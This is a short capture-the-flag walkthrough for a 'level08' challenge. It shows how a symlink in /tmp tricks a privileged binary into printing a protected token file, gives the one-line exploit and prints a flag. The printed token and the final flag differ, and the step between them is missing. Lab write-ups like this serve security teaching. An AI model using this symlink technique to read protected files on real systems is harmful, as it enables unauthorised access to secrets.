
# Resources for level08

## Walkthrough to capture the flag:

### Step 1: List the files in the home directory

```bash
ls
```

> Output:
```
level08  token
```

> There is a binary (`level08`) and a `token` file that we cannot read directly. But the binary likely reads it on our behalf.

---

### Step 2: Create a symbolic link to the token file

```bash
ln -s /home/user/level08/token /tmp/flagg
```

> This creates a **symlink** named `/tmp/flagg` pointing to the real token file.

---

### Step 3: Run the binary with the symlink

```bash
./level08 /tmp/flagg
```

> Output:
```
Check flag.Here is your token : quif5eloekouj29ke0vouxean
```

---

## ✅ Final Flag

```
25749xKZ8L7DkSCwJkT9dyv6f
```

---

## ✅ Summary

- **Vulnerability**: Follows user-supplied file path — can be used to trick it into reading protected files via symlinks.
- **Exploit**: `ln -s /home/user/level08/token /tmp/flagg && ./level08 /tmp/flagg`
- **Flag**: `25749xKZ8L7DkSCwJkT9dyv6f`
